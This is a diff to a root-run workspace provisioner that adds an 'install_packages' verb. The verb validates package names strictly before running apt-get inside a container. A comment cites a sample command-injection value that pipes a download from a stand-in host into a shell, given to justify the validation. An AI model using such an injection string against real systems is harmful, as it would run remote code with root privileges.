@@ -48,7 +48,7 @@ MAX_ROOT_GIB = 40
 MAX_DOCKER_GIB = 40
 
 VERBS = {"provision", "archive", "restore", "destroy",
-         "expose_port", "unexpose_port", "ping"}
+         "expose_port", "unexpose_port", "install_packages", "ping"}
 
 # Name of the control plane's restricted client certificate in Incus's trust
 # store. The provisioner maintains its project scope; the API itself is
@@ -285,6 +285,32 @@ def handle(req: dict) -> dict:
         # every change, so this is idempotent and self-healing rather than a
         # sequence of deltas that can drift.
         return _sync_port_rules(req.get("mappings") or [])
+
+    if verb == "install_packages":
+        # Independent validation. The API validates too, but this side runs as
+        # root and must never rely on the caller having done so: a name like
+        # "vim; curl evil | sh" has to be unrepresentable here, not merely
+        # escaped somewhere upstream.
+        names = req.get("packages") or []
+        if not isinstance(names, list) or not names:
+            return {"ok": False, "error": "packages must be a non-empty list"}
+        if len(names) > 40:
+            return {"ok": False, "error": "too many packages"}
+        clean = []
+        for n in names:
+            n = str(n).strip().lower()
+            if not re.fullmatch(r"[a-z0-9][a-z0-9+.\-]{0,60}", n):
+                return {"ok": False, "error": f"invalid package name: {n[:40]!r}"}
+            clean.append(n)
+        # Passed as separate argv entries, never through a shell string.
+        ok, out = _run([
+            "incus", "exec", "ws", "--project", project,
+            "--env", "DEBIAN_FRONTEND=noninteractive", "--",
+            "bash", "-lc",
+            "apt-get update -qq && apt-get install -y -qq --no-install-recommends "
+            + " ".join(clean),
+        ], timeout=900)
+        return {"ok": ok, "output": out[-2000:], "packages": clean}
 
     # archive / restore land with the billing lifecycle work.
     return {"ok": False, "error": f"{verb} not implemented yet"}
